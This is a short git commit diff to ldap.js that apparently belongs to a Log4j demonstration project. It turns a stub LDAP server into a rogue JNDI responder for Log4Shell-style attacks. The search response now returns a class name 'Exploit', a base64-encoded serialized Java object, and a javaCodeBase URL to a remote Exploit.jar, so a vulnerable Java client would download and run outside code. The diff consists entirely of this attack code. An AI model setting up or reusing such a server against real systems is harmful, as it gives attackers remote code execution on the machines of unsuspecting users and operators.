7310e43232cc7440bfb1e870551bc6a29c1edd17
Alexander Sidorov <alexander.sidorov@tibbo.com>
2024-11-07 18:17:50 +0300

    update

--- ldap.js
+++ ldap.js
@@ -1,7 +1,7 @@
 const ldap = require('ldapjs')
 const server = ldap.createServer()
 const port = 1389
-
+// com.sun.jndi.ldap.object.trustURLCodebase = true
 server.search('', (req, res, next) => {
   // Print request attributes to the console
   console.log(req);
@@ -9,7 +9,11 @@ server.search('', (req, res, next) => {
   // Dummy response
   res.send({
     dn: '',
-    attributes: {}
+    attributes: {
+		javaClassName: 'Exploit',
+		javaSerializedData: Buffer.from('rO0ABXNyABNvcmcuZXhwbG9pdC5FeHBsb2l0qpnQ3f5bGOADAAB4cHg=', 'base64'),
+		javaCodeBase: 'https://raw.githubusercontent.com/etojesaandro/log4j-sample/main/Exploit.jar'
+	}
   })
 
   res.end()
